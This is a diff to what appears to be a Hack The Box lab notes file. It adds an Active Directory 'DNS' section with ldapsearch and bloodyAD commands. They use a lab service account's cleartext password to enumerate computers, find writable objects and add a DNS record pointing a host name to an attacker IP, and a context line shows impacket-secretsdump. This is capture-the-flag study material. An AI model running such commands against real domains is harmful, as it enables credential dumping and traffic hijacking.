@@ -1706,3 +1706,17 @@ impacket-secretsdump  htb.local/'svc-alfresco':s3rvice@10.129.95.210
 - https://www.hackingarticles.in/windows-privilege-escalation-dnsadmins-to-domainadmin/
   
 </details>
+
+---
+<details>
+  <summary><strong>DNS</strong></summary>
+
+```bash
+ldapsearch -x -H ldap://overwatch.htb -D 'sqlsvc@overwatch.htb' -w 'TI0LKcfHzZw1Vv' -b 'DC=overwatch,DC=htb' '(&(objectClass=computer)(!(name=S200401)))' name dNSHostName operatingSystem servicePrincipalName
+
+bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv get writable
+
+bloodyAD --host S200401.overwatch.htb -u sqlsvc -p TI0LKcfHzZw1Vv add dnsRecord SQL07 10.10.14.61
+```
+  
+</details>
